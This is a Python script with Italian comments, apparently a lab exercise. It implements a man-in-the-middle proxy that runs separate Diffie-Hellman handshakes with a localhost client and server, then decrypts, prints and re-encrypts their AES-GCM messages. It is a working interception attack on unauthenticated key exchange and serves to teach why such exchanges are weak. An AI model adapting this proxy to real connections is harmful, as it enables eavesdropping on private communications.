#!/usr/bin/env python3
import socket
from cryptography.hazmat.primitives.asymmetric import dh
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from common import derive_key, send_encrypted, recv_decrypted

# Parametri di configurazione per l'attacco Man-in-the-Middle
LISTEN_HOST = '127.0.0.1'
LISTEN_PORT = 65433   # porta su cui il client si connette (il proxy si fa passare per il server)
SERVER_HOST = '127.0.0.1'
SERVER_PORT = 65432   # porta del vero server (a cui il proxy si connette come fosse un client)

def dh_handshake(sock, parameters=None):
    """
    Se parameters==None:
      -> genera nuovi (p,g) e chiave privata di Mallory,
      -> invia p,g,Y_mallory al peer,
      -> riceve Y_peer,
      -> restituisce (shared_key, parameters)
    Se parameters!=None:
      -> riceve p,g,Y_peer,
      -> calcola Y_mallory e lo invia,
      -> restituisce (shared_key, parameters)
    """
    # 1) Funzione per gestire l'handshake Diffie-Hellman in entrambe le direzioni
    if parameters is None:
        # 1.1) Primo caso: Mallory genera i parametri (come un server)
        # Questo viene usato nell'handshake verso il client
        parameters = dh.generate_parameters(generator=2, key_size=2048)
        priv = parameters.generate_private_key()
        pub = priv.public_key().public_numbers().y
        
        # Invia p, g, e la chiave pubblica di Mallory al peer (il client)
        nums = parameters.parameter_numbers()
        sock.sendall(f"{nums.p},{nums.g},{pub}".encode())
        
        # Riceve la chiave pubblica del peer (client)
        peer_pub = int(sock.recv(8192).decode())
    else:
        # 1.2) Secondo caso: Mallory riusa i parametri esistenti (come un client)
        # Questo viene usato nell'handshake verso il server
        # Riceve p, g, e la chiave pubblica dal peer (server)
        data = sock.recv(8192).decode()
        p_str, g_str, peer_pub_str = data.split(',')
        p, g = int(p_str), int(g_str)
        peer_pub = int(peer_pub_str)
        
        # Ricostruisce i parametri e genera la propria chiave
        parameters = dh.DHParameterNumbers(p, g).parameters()
        priv = parameters.generate_private_key()
        pub = priv.public_key().public_numbers().y
        
        # Invia la chiave pubblica di Mallory al peer (server)
        sock.sendall(str(pub).encode())

    # 2) Calcolo del segreto condiviso con ciascun peer
    # Questo permette a Mallory di avere una chiave condivisa diversa con client e server
    peer_nums = dh.DHPublicNumbers(peer_pub, parameters.parameter_numbers())
    shared = priv.exchange(peer_nums.public_key())
    return shared, parameters

def main():
    # 3) Configurazione del proxy MITM
    # Il proxy si mette in ascolto per intercettare la connessione del client
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proxy:
        proxy.bind((LISTEN_HOST, LISTEN_PORT))
        proxy.listen(1)
        print(f"[+] MITM in ascolto su {LISTEN_HOST}:{LISTEN_PORT}")
        client_conn, client_addr = proxy.accept()
        print(f"[+] Client connesso da {client_addr}")

        # 4) Connessione al vero server
        # Mallory stabilisce una connessione separata al server di destinazione
        server_conn = socket.create_connection((SERVER_HOST, SERVER_PORT))
        print(f"[+] Collegato al server {SERVER_HOST}:{SERVER_PORT}")

        # 5) Handshake DH Client⇄Mallory
        # Mallory si comporta come un server verso il client
        client_shared, params = dh_handshake(client_conn, parameters=None)
        print("[*] DH completo con il client")

        # 6) Handshake DH Mallory⇄Server
        # Mallory si comporta come un client verso il server
        # Riutilizza gli stessi parametri per evitare problemi di compatibilità
        server_shared, _ = dh_handshake(server_conn, parameters=params)
        print("[*] DH completo con il server")

        # 7) Setup AES-GCM per entrambi i canali
        # Mallory genera chiavi diverse per ciascuna connessione
        client_key = derive_key(client_shared)
        server_key = derive_key(server_shared)
        client_aes = AESGCM(client_key)
        server_aes = AESGCM(server_key)

        # 8) Funzione di forwarding bidirezionale
        # Permette di intercettare, leggere e inoltrare i messaggi in entrambe le direzioni
        def forward(src, dst, aes_src, aes_dst, who_from, who_to):
            try:
                # Riceve e decifra il messaggio dalla sorgente
                msg = recv_decrypted(src, aes_src)
            except EOFError:
                # Gestisce la chiusura della connessione
                return False
            
            # Visualizza il messaggio decifrato (l'attacco è riuscito!)
            print(f"[{who_from} -> {who_to}] {msg.decode()!r}")
            
            # Cifra e inoltra il messaggio alla destinazione
            send_encrypted(dst, aes_dst, msg)
            return True

        # 9) Loop principale del proxy MITM
        # Continua a inoltrare i messaggi finché una connessione si chiude
        while True:
            # Client -> Server
            if not forward(client_conn, server_conn, client_aes, server_aes, "Client", "Server"):
                break
            # Server -> Client
            if not forward(server_conn, client_conn, server_aes, client_aes, "Server", "Client"):
                break

        # 10) Pulizia e chiusura delle connessioni
        client_conn.close()
        server_conn.close()
        print("[!] MITM proxy terminato")

# Punto di ingresso dello script
if __name__ == '__main__':
    main()
